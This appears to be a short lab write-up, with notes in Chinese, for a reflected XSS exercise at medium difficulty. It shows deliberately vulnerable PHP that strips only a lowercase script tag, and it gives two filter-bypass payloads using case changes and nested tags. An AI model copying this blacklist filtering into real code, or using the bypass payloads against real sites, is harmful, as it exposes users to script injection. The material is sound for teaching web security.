# XSS (Reflected) - Medium

## View Source

```PHP
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

?>
```

- [`str_replace($a, $b, $c)`](https://www.php.net/manual/en/function.str-replace.php)
    - 將 *c* 內全部的 *a* 換成 *b* 後回傳

## Code Review

- 將 `<script>` 替換成空字串

## Answer

- 因為是類似黑名單的方法，可以透過大小寫變換等繞過

### Example

```
<Script>alert(1)</script>
<scr<script>ipt>alert(1)</script>
```